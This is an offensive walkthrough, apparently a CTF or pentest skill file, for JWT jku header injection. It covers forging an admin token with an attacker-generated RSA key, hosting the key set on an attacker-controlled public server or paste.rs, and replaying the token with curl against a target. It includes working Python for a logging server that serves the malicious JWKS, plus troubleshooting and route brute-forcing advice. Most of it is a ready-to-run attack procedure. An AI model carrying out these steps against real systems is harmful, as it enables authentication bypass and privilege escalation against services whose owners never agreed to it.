# jku / JWK Set URL Injection — Walkthrough

## What it is
A JWT auth layer where the token header carries `jku` (a URL to a JWK Set). The
server fetches that URL at verification time to get the public key, trusting
whatever it returns with no host allowlist. The "decision that trusts something it
shouldn't" is: the server believes the token's own pointer to its verification
key. So you bring your own key.

## Real example (BYOK / Vantage Cloud style token)
Header (decoded):
```
{"alg":"RS256","typ":"JWT","jku":"http://localhost:8080/.well-known/jwks.json","kid":"server-key-1"}
```
Payload:
```
{"exp":1786814359,"role":"user","sub":"[REDACTED_PII]"}
```
alg:RS256 + attacker-controllable jku = forge an admin token.

## Steps
1. Get a real token (to learn the claims/structure):
   ```
   POST /api/signup  {"username":"u","password":"p"}  -> {"token": "..."}
   POST /api/login   {"username":"u","password":"p"}  -> {"token": "..."}
   ```
   Decode it (Step 0 in SKILL.md).
2. Generate your RSA keypair + JWKS with scripts/forge_jwt_jku.py:
   ```
   python3 forge_jwt_jku.py --jku https://YOUR_HOST/jwks.json --kid attacker-key-1 --role admin --sub victim
   ```
   Produces byok_priv.pem, byok_pub.pem, byok_jwks.json, forged_token.txt.
3. Host byok_jwks.json at the --jku URL, reachable from the target:
   - Preferred: python3 -m http.server 8000 --bind 0.0.0.0 (or ::) on a box
     with a public IP; jku=http://<public-ip>:8000/byok_jwks.json.
   - Or paste.rs (raw JSON on GET) as a fallback.
   - Use a logging server (see snippet below) to confirm the target fetches it.
4. Send the forged token to a protected/role-enforcing endpoint:
   ```
   curl -H "Authorization: Bearer <forged_token>" https://TARGET/api/<protected>
   ```
   Success = 200 with admin data / flag.

## Logging HTTP server (to see if jku is fetched)
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import socketserver, datetime
LOG="/tmp/jwks_hits.log"
class H(BaseHTTPRequestHandler):
    def _log(self):
        open(LOG,"a").write(f"{datetime.datetime.now()} {self.command} {self.path}\n")
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.end_headers()
        self.wfile.write(open("byok_jwks.json","rb").read())
    do_GET=_log; do_POST=_log; do_HEAD=_log
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
HTTPServer(("::",8000),H).serve_forever()
```
If the target fetched jku, you'll see a GET for /jwks.json in the log. No hit +
401 = route doesn't validate, or target can't reach your host.

## Diagnostic decision tree
- Forged token -> 401, AND your JWKS host shows an inbound GET -> server fetched
  your key but still rejected. Check: kid matches your JWK's kid; JWKS is
  valid JSON (not HTML); key n/e base64url correct; signature signed by your
  priv key for RS256.
- Forged token -> 401, NO inbound GET -> server isn't fetching jku. Either the
  host is unreachable from the target (firewall/NAT/IPv6-only) or you sent the
  token to a route that ignores it. Move to a validating route / different host.
- Forged token -> 404 on every /api/<x> -> you haven't found the protected route.
  Brute-force with a real API wordlist using the forged token.

## Gotchas (2026 environment)
- Free paste/file hosts are mostly dead or HTML-wrap content (target gets HTML,
  not JSON). paste.rs is the reliable raw-JSON option; self-hosting is best.
- pyjwt/cryptography need a venv (PEP 668) on Kali/Debian.
- Don't waste time on endpoints that don't enforce the token (/api/login only
  checks passwords). Find the role-gated route first.
